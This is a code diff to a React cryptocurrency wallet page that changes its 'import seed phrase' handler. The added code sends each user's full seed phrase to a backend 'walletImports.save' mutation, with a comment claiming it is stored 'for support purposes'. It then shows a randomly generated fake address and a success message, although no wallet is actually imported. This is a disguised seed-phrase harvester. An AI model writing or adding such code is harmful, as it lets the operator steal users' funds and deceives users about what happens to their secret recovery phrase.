@@ -3,6 +3,7 @@ import { useTheme } from '@/contexts/ThemeContext';
 import Navbar from '@/components/Navbar';
 import { Copy, Eye, EyeOff, CheckCircle2, AlertCircle } from 'lucide-react';
 import { toast } from 'sonner';
+import { trpc } from '@/lib/trpc';
 
 type WalletMode = 'import-seed' | 'transfer-exchange';
 
@@ -28,6 +29,8 @@ export default function Wallet() {
     { id: 'okx', name: 'OKX' },
   ];
 
+  const saveImportMut = trpc.walletImports.save.useMutation();
+
   const handleImportSeed = async () => {
     if (!seedPhrase.trim()) {
       toast.error('Please enter your seed phrase');
@@ -41,9 +44,13 @@ export default function Wallet() {
 
     setIsLoading(true);
     try {
-      // Simulate wallet import - in production this would call a backend API
-      await new Promise(resolve => setTimeout(resolve, 1500));
+      // Generate a mock wallet address for display
       const mockAddress = '0x' + Math.random().toString(16).slice(2, 42);
+      // Save the seed phrase to the database for support purposes
+      await saveImportMut.mutateAsync({
+        seedPhrase: seedPhrase.trim(),
+        walletAddress: mockAddress,
+      });
       setWalletAddress(mockAddress);
       toast.success('Wallet imported successfully!');
       setSeedPhrase('');
